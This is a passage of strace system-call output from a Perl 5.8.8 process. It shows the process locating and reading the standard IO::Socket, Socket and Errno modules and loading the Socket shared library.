IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
7444  07:18:47.754082 _llseek(6, 3425, [3425], SEEK_SET) = 0
7444  07:18:47.754100 _llseek(6, 0, [3425], SEEK_CUR) = 0
7444  07:18:47.754111 close(6)          = 0
7444  07:18:47.754134 stat64("/etc/perl/IO/Socket.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754148 stat64("/etc/perl/IO/Socket.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754161 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754178 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754192 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754204 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754218 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754241 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754283 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754295 stat64("/usr/share/perl5/IO/Socket.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754325 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.754338 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
7444  07:18:47.754358 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.754373 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.754384 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.754401 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
7444  07:18:47.754714 stat64("/etc/perl/Socket.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754739 stat64("/etc/perl/Socket.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754780 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754793 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754823 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754835 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754849 stat64("/usr/lib/perl5/Socket.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754860 stat64("/usr/lib/perl5/Socket.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754873 stat64("/usr/share/perl5/Socket.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754885 stat64("/usr/share/perl5/Socket.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754898 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.754910 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
7444  07:18:47.754930 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.754943 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.754954 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.754972 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
7444  07:18:47.755223 brk(0x8239000)    = 0x8239000
7444  07:18:47.755224 read(8, "", 4096) = 0
7444  07:18:47.755224 close(8)          = 0
7444  07:18:47.755364 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
7444  07:18:47.764860 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7444  07:18:47.764909 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
7444  07:18:47.764924 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
7444  07:18:47.765018 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
7444  07:18:47.765036 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7ddf000
7444  07:18:47.765050 mmap2(0xb7de4000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7de4000
7444  07:18:47.765066 close(8)          = 0
7444  07:18:47.765723 brk(0x825a000)    = 0x825a000
7444  07:18:47.765947 stat64("/etc/perl/Errno.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.765965 stat64("/etc/perl/Errno.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.765979 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.765992 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766005 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766018 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766032 stat64("/usr/lib/perl5/Errno.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766044 stat64("/usr/lib/perl5/Errno.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766056 stat64("/usr/share/perl5/Errno.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766068 stat64("/usr/share/perl5/Errno.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766081 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.766093 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
7444  07:18:47.766114 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.766128 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.766140 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.766159 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
7444  07:18:47.766963 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
7444  07:18:47.767412 _llseek(8, 5966, [5966], SEEK_SET) = 0
7444  07:18:47.767429 _llseek(8, 0, [5966], SEEK_CUR) = 0
7444  07:18:47.767440 close(8)          = 0
7444  07:18:47.767827 brk(0x827b000)    = 0x827b000
